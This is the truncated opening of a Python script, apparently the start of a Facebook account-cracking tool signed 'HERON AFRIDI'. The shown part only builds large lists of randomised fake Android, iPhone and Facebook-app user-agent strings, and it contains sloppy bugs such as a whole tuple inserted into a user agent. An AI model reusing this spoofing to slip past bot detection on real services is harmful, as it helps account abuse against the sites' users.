"""
Source BY HERON AFRIDI
- Never Show your Face🥱
- By Kids
"""
#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
import os,time,random,string,re,sys,requests,json,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
gtxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

####$#######
B = '\033[38;5;46m'
R = '\033[38;5;46m'
G = '\033[38;5;46m'
H = '\033[38;5;46m'
BL = '\033[38;5;46m'
BG = '\033[38;5;46m'
S = '\033[38;5;46m'
W = '\033[38;5;46m'
EX = '\033[38;5;46m'
E = '\033[38;5;46m'
#########
ugen=[]
for xttttd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' TL-tl; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
for saggt in range(10000):
	a='NokiaX'
	b=random.randrange(1,9)
	c='-0'
	d=random.randrange(1,9)
	e='/'
	f=random.randrange(1,9)
	g='.0 ('
	h=random.randrange(1,12)
	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
	j='UNTRUSTED/'
	k=random.randrange(1,3)
	l='.0'
	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
	ugen.append(uaku2)
for ttx in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakua)
for i in range(10000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 6A Build/N2G47H)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	l='Mobile Safari/537.36'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
#User Agnes buatan Asep Yusup 
	rr = random.randint
	rc = random.choice
	satu = f"Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
	dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
	tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(111111,199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/ {str(rr(2111111,2999999))} Mobile Safari/537.36"
	empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
	uaku2 = str(rc([satu,dua,tiga,empat]))
	ugen.append(uaku2)
for brayen in range(10000):
	rr = random.randint
	rc = random.choice
	u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
	u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J610G Build/PPR1.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
	u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-G610M Build/PKQ1.{str(rr(111111,210000))}.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
	u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2109 Build/RKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
	u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/PKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
	voda = random.choice([u1, u2, u3, u4, u5])
	ugen.append(voda)
for ggyggd in range(10000):
	x1="Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
	ff=(x1)
	ugen.append(ff)
for txt in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='Infinix X6816 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/353.0.0.5.112;]'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for txxxtt in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for txrelmet in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='RMX3081 Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/294.0.0.12.118;]'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for txret in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='RMX2156 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/313.0.0.7.110;]'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for txoppt in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='CPH1969 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,250)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/344.0.0.10.83;]'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for xxdtf in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for xtd in range(5000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)
for xz in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
##########
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for t in range(10000):
	aa='Mozilla/5.0 (Linux; Android 7.0; '
	b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
	c='Hisense F102) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku)
for xdtttttx in range(3000):
	build_nokiax = ['JDQ39','JZO54K']
	rr = random.randint; rc = random.choice
	miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
	miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
	miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
	gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
	ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
	memekk = random.choice([ugent1, ugent2, ugent3])
	ugen.append(memekk)
for xffd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
